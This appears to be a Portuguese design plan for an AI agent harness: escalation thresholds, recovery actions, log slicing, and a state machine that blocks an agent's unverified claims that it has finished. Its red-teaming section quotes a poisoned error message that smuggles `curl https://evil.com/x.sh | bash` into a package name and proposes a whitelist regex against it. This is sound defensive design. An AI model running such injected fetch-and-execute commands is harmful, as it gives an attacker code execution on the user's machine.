# 🧠 PLANO ARQUITETURAL: `jev-harness` como Motor Executivo de **System 1.5**

> **Status do Documento:** Aprovado para Implementação na `v0.2.0`  
> **Estado Base Auditado:** `v0.1.11` (100% Sincronizado e Publicado nos 4 Registries)  
> **Metodologia de Governança:** Fable-Judge (Zero-Trust Truthfulness) & Karpathy Principles  
> **Referências Fundamentais:**  
> - Josh Rosen (`@JoshARosen`, TypeSafe AI) — *Os 5 Pilares do System 1.5 em Agentes Autônomos*  
> - TypeSafe AI (Diogo Almeida, Erik Gafni, Sasha Sheng) — *Jev Non-Autoregressive Decision Engine*  
> - Pesquisa de Fronteira: *System-1.5 Reasoning: Dynamic Shortcuts & Compute Allocation* (arXiv:2505.18962)

---

## 1. O Que é o **System 1.5** e Por Que Ele é o Elo Perdido?

Na engenharia de sistemas agentic modernos, a dicotomia clássica entre **System 1** e **System 2** (Daniel Kahneman) apresenta um gap estrutural severo:

```
┌────────────────────────────────────────┐
│         System 1 (Reativo)             │
│  - Heurísticas locais / Regex (< 1ms)  │ ──┐
│  - Classificadores não-autorregressivos│   │   ABISMO DE COORDENAÇÃO
│    (Jev System One: 70ms - 200ms)      │   │   - Sem memória transiente de sessão
└────────────────────────────────────────┘   │   - Sem capacidade de recuperação terminal
                                             │   - Sem autoridade de ciclo de vida
                                             ▼
┌────────────────────────────────────────┐
│         System 1.5 (Executivo)         │  ◄── [O JEVS HARNESS]
│  - Cola entre raciocínio rápido/lento │      - Máquina de Estados com Julgamento
│  - Decisões tipadas com escalonamento │      - Alocação de Test-Time Compute
│  - Roteamento e recuperação segura     │      - Atenção cirúrgica e poda de contexto
└────────────────────────────────────────┘
                                             ▲
┌────────────────────────────────────────┐   │   GARGALO DE CONSUMO
│         System 2 (Deliberativo)        │   │   - Queima 50.000+ tokens em erros triviais
│  - Frontier LLMs Generativos           │ ──┘   - Doom loops circulares infinitos
│    (GPT-6 Astra, Claude Fable 5.1,     │       - Desperdício de raciocínio profundo
│     DeepSeek V4-Pro, Qwen 3.8 Max)     │       - Conclusão prematura sem testes
└────────────────────────────────────────┘
```

### Distinção Crucial entre Níveis de System 1.5:
1. **Nível Micro-Cognitivo / Latente (Modelo Interno - arXiv:2505.18962):**  
   Refere-se ao modelo autorregressivo que utiliza *shortcuts* no espaço latente (early-exit em camadas do Transformer e pulo de tokens intermediários de Chain-of-Thought) para economizar FLOPS de inferência.
2. **Nível Macro-Cognitivo / Executivo (Harness de Agentes - Josh Rosen / Jev Harness):**  
   Refere-se ao **orquestrador determinístico com julgamento probabilístico**: uma camada de controle em tempo de execução que governa *quando*, *como*, *com qual orçamento de raciocínio* e *com qual recorte de atenção* o System 2 deve ser acionado.

### A Definição dos 5 Pilares (Josh Rosen):
> *"What you all think System 1.5 means:*  
> 1. *glue between fast and deep reasoning*  
> 2. *cheap typed decisions that escalate when unsure*  
> 3. *deterministic routing, gates, and recovery*  
> 4. *perception and attention for agents*  
> 5. *state machines with judgment*  
>  
> *Yes, it's all of the above."*

---

## 2. Tabela da Verdade: Auditoria de Claims (`v0.1.11`) vs. Requisitos `v0.2.0`

Seguindo o protocolo **Fable-Judge**, a tabela abaixo separa com precisão empírica o que **já está implementado e verificado no código (`v0.1.11`)** do que constitui o gap técnico a ser resolvido no **System 1.5 Engine (`v0.2.0`)**:

| Pilar do System 1.5 | Estado Atual no Código (`v0.1.11`) | Limitação / Vulnerabilidade Identificada | Especificação Exata da Evolução (`v0.2.0`) |
| :--- | :--- | :--- | :--- |
| **1. Glue Between Fast & Deep Reasoning** | - Gate `modulate_reasoning_effort`: classifica entre 8 níveis de esforço (`none`..`ultra`).<br>- Compilador estático `build_provider_params` para 7 dialetos de provedores.<br>- Retorna `lease_steps` (`1`, `2`, `5`, `10`). | O `lease_steps` é passivo: o agente chamador precisa gerenciar o contador manualmente. Não há invalidação automática se ocorrer erro no meio do lease. | **Persistent Auto-Lease & Break-Glass Protocol**: Sessão gerencia `active_lease_remaining`. Consultas repetidas retornam esforço em `0ms`. Em caso de erro de ferramenta, o lease é imediatamente cancelado (*break-glass*). |
| **2. Cheap Typed Decisions That Escalate When Unsure** | - Gate `triage_test_failure`: avalia `category` (Choice), `severity` (Score), `skip_llm` (Noul).<br>- Escala para System 2 se `category == "deep_logic"` ou `skip_prob < threshold`. | Avalia apenas a probabilidade do vencedor ($P_{(1)}$). Ignora a proximidade com o 2º colocado ($\Delta P$) e a entropia da distribuição. No mock offline, probabilidades são estáticas. | **Compound Uncertainty Calibration**: Cálculo da Margem Probabilística ($\Delta P = P_{(1)} - P_{(2)}$) e Entropia de Shannon Normalizada ($H_n$). Flag universal `escalate_to_system2` disparada se $\Delta P < 0.20$ ou $H_n > 0.75$. |
| **3. Deterministic Routing, Gates & Recovery** | - 6 Gates semânticos com exit codes Unix (`0`, `1`, `2`).<br>- `should_abort_trajectory` detecta repetição.<br>- Mensagem textual `action_recommendation`. | A ação de recuperação é apenas texto livre (`AUTO-ACTION: Install...`). Se o agente tentar executar cegamente, arrisca injeção de shell (CWE-78) e incompatibilidade de package managers (`uv`, `pnpm`, `cargo`). | **Sanitized Structured Auto-Recovery (`RecoveryAction`)**: Extração determinística de pacote com regex estrito anti-RCE (`^[a-zA-Z0-9_\-@\.\/]+$`), detecção do gerenciador do repo e comando estruturado seguro. |
| **4. Perception & Attention for Agents** | - Truncamento seguro UTF-8 preservando início e fim do log.<br>- Priorização de asserções reais sobre erros transitórios.<br>- Alerta de KV-Cache quando `session_context_tokens > 30000`. | O truncamento preserva 6.000 caracteres brutos. Quando `skip_llm = False`, o System 2 recebe poluição de logs desnecessários, gastando tokens e dispersando a atenção do modelo. | **Multi-Tier Perception Window**: Devolução de 3 níveis de contexto: `focused_slice` (~200 tokens contendo teste + asserção exata), `causal_context` (~1.000 tokens com setup/stdout) e `raw_log_ref`. |
| **5. State Machines with Judgment** | - Gate `should_nudge_continuation`: avalia `workflow_phase` (`research`, `ask`, `plan`, `execute`, `verify`, `complete`) + 3 perguntas Noul (`nudge`, `waiting`, `progress`). | As transições de fase não são formalizadas. O agente ainda pode tentar pular de `execute` direto para `complete` se declarar falsamente no texto que "terminou". | **Semantic Finite Automaton (S-DFA)**: Máquina de estados determinística com guardas semânticas estritas. Transição `execute -> complete` é fisicamente bloqueada pelo Harness sem evidência verificada de testes passando. |

---

## 3. Análise Crítica Adversarial (Red-Teaming das Propostas)

### Vetor 1: Vulnerabilidade de Shell Injection em `recovery_command` (CWE-78)
* **Cenário de Ataque:** Um arquivo de teste malicioso ou log manipulado emite:  
  `ModuleNotFoundError: No module named 'legit_pkg; curl https://evil.com/x.sh | bash'`
* **Risco Real:** Se o Jev Harness extrair o pacote por regex ingênuo e gerar `pip install legit_pkg; curl...`, um agente com permissão de execução de terminal sofrerá RCE imediato.
* **Mitigação Inviolável:**
  1. Regex com whitelist fechada de caracteres: `^[a-zA-Z0-9][a-zA-Z0-9_.\-]*$` (com suporte a scopes `@scope/pkg` no ecossistema npm).
  2. Qualquer caractere fora da whitelist aborta a geração do comando determinístico, marcando `is_safe_auto_run = False`.
  3. Descoberta inteligente do ambiente: verificar a presença de `uv.lock`, `poetry.lock`, `package-lock.json`, `pnpm-lock.yaml`, `bun.lockb`, `Cargo.lock` para emitir o comando no formato do projeto.

### Vetor 2: Context Deprivation (O Risco do `focused_slice` Excessivamente Curto)
* **Problema:** Reduzir o traceback a meras 15 linhas pode omitir o erro de configuração em uma fixture do pytest executada 100 linhas antes, ou a saída de stdout que continha a causa raiz da falha de banco de dados.
* **Mitigação Inviolável:** Não descartar o contexto. Entregar um objeto composto:
  - `focused_slice`: Os frames críticos de asserção (para injeção direta no prompt imediato).
  - `causal_context`: O bloco circundante higienizado (para consulta caso o System 2 solicite).
  - `log_id`: Identificador persistido em disco pelo `session.py` para inspeção sob demanda.

### Vetor 3: Calibração Falsa em Modo de Simulação Offline
* **Problema:** Na ausência de chave de API, o motor heurístico `_simulate_system_one` atribuía probabilidades sintéticas estáticas (ex: `0.85` vs `0.15/(K-1)`). Se o cálculo de margem for $\Delta P = P_{(1)} - P_{(2)}$, o modo offline sempre resultaria em margem `> 0.70`, tornando a funcionalidade de escalonamento inoperante em testes e CI.
* **Mitigação Inviolável:** O motor heurístico offline deve calcular a entropia com base em **ambiguidade de sinais**: se o log contiver evidências conflitantes (ex: menção a `AssertionError` E menção a `ConnectionResetError`), as probabilidades simuladas devem refletir a incerteza real (ex: `0.52` vs `0.48`), ativando deterministicamente `escalate_to_system2 = True`.

---

## 4. Formulação Matemática Formal do System 1.5

### 4.1. Calibração de Incerteza e Disjuntor de Escalonamento (Pilar 2)

Dada uma pergunta tipada $Q$ com $K$ opções e distribuição de probabilidades $\mathbf{P} = \{p_1, p_2, \dots, p_K\}$ tal que $\sum_{i=1}^K p_i = 1$:

1. **Ordenação:** Seja $P_{(1)} \ge P_{(2)} \ge \dots \ge P_{(K)}$ a sequência ordenada das probabilidades.
2. **Margem Probabilística:**
   $$\Delta P = P_{(1)} - P_{(2)}$$
3. **Entropia de Shannon Normalizada:**
   $$H_n(\mathbf{P}) = -\frac{1}{\ln K} \sum_{i=1}^K p_i \ln(p_i) \quad \in [0, 1]$$
4. **Função Decisória de Escalonamento ($\mathcal{E}$):**
   $$\mathcal{E}(\mathbf{P}, \text{conf}) = \begin{cases} 
   \text{True (Escalar para System 2)}, & \text{se } \Delta P < \tau_{\text{margin}} \lor H_n(\mathbf{P}) > \tau_{\text{entropy}} \lor \text{conf} < \tau_{\text{conf}} \\
   \text{False (Decisão System 1.5 Segura)}, & \text{caso contrário}
   \end{cases}$$
   *Hiperparâmetros Calibrados:* $\tau_{\text{margin}} = 0.20$, $\tau_{\text{entropy}} = 0.75$, $\tau_{\text{conf}} = 0.65$.

### 4.2. Autômato Finito com Guardas Semânticas (S-DFA - Pilar 5)

Definido formalmente como uma 6-tupla:
$$\mathcal{M} = (S, \Sigma, \Gamma, \delta, s_0, F)$$
* **Estados:** $S = \{\text{RESEARCH}, \text{ASK}, \text{PLAN}, \text{EXECUTE}, \text{VERIFY}, \text{COMPLETE}, \text{ABORT}\}$
* **Alfabeto de Ações do Agente:** $\Sigma = \{\text{propose\_next\_step}, \text{request\_user\_input}, \text{run\_tool}, \text{claim\_finished}\}$
* **Guardas Semânticas ($\Gamma$):**
  - $g_{\text{user\_question}}$: O output contém interrogação ou pedido de aprovação pendente.
  - $g_{\text{tests\_passed}}$: Evidência formal de saída limpa de teste (`looks_like_test_success == True`).
  - $g_{\text{pending\_edits}}$: Existem arquivos modificados sem subsequente execução de testes.
* **Matriz de Transição Rígida ($\delta$):**
  - $\delta(\text{EXECUTE}, \text{claim\_finished}, \neg g_{\text{tests\_passed}}) \implies \mathbf{VERIFY}$ *(Veto automático de conclusão prematura com `should_nudge = True`)*
  - $\delta(\text{ANY}, \text{propose\_next\_step}, g_{\text{user\_question}}) \implies \mathbf{ASK}$ *(Veto de nudge quando o agente deve esperar o usuário)*
  - $\delta(\text{VERIFY}, \text{claim\_finished}, g_{\text{tests\_passed}} \land \neg g_{\text{pending\_edits}}) \implies \mathbf{COMPLETE}$

---

## 5. Especificação Técnica de Implementação para a `v0.2.0`

### Entrega 1: `UncertaintyEngine` e Contrato Universal de Escalonamento
* Implementar em Python ([`client.py`](file:///home/ismaelsoilet/jev-harness/src/jev_harness/client.py)), TypeScript (`packages/ts/src/client.ts`) e Rust (`packages/rust/src/client.rs`).
* Estrutura de dados tipada:
  ```python
  @dataclass
  class UncertaintyMetrics:
      margin: float
      normalized_entropy: float
      escalate_to_system2: bool
      escalation_reason: str
  ```
* Incorporar métricas em todas as respostas dos 6 gates semânticos.

### Entrega 2: `StructuredRecovery` & `PerceptionSlicer`
* **Schema Seguro de Recuperação:**
  ```python
  @dataclass
  class RecoveryAction:
      action_type: str  # 'install_dependency', 'retry_flaky', 'fix_syntax', 'escalate'
      package_name: Optional[str]
      package_manager: Optional[str]  # 'uv', 'pip', 'npm', 'pnpm', 'bun', 'cargo'
      shell_command: Optional[str]
      is_safe_auto_run: bool
      rationale: str
  ```
* **Extrator de Sinal:**
  - Extrair o bloco de asserção isolado (máximo 15 linhas) sem ruído de setup/teardown.
  - Devolver `focused_slice` e `causal_context` no `TestTriageResult`.

### Entrega 3: Orquestrador Unificado `evaluate_agent_turn` (CLI `turn-gate` / MCP `jev_evaluate_turn`)
* Consolidação em **uma única chamada Jev System One** em lote (`~80ms`):
  - Compactador de contexto: comprime o transcript recente e saídas de ferramentas para um payload `< 3.000` caracteres (preservando GPU KV-cache).
  - Execução paralela não-autorregressiva das perguntas de fase, nudge, abort e esforço.
  - Aplicação das guardas da S-DFA para retornar o estado corrigido do turno.

### Entrega 4: Break-Glass Lease Tracker Persistente
* Extensão de [`session.py`](file:///home/ismaelsoilet/jev-harness/src/jev_harness/session.py) protegida por `fcntl.flock`/`msvcrt`:
  - `active_reasoning_lease`: armazena `{ effort, provider_params, steps_remaining }`.
  - Se `steps_remaining > 0` e nenhum erro de ferramenta ocorreu no último turno: retornar imediatamente os parâmetros de esforço em `0ms`.
  - Se ocorrer falha ou veto: acionar protocolo *break-glass*, zerando o lease e forçando nova avaliação.

---

## 6. Governança e Checklist de Lançamento da `v0.2.0`

1. **Zero External Runtime Dependencies**: Manter Python pure-stdlib (`urllib`), TypeScript sem runtime dependencies e Rust em Tokio estável.
2. **Paridade Tri-Runtime Estrita**: Toda função, cálculo matemático de $\Delta P / H_n$, comando CLI e ferramenta MCP deve produzir resultados semanticamente equivalentes em Python, TypeScript e Rust.
3. **Bateria de Testes Expandida**: Adicionar testes adversariais para injeção de shell em comandos de recuperação, cálculo de entropia com distribuições uniformes e bimodalidades, e testes de estresse concorrente no lease tracker.
4. **Protocolo Quad-Sync**: Verificação mandatória com `./scripts/release.sh --verify-sync` antes do push para as 4 plataformas (GitHub, PyPI, npm, Crates.io).
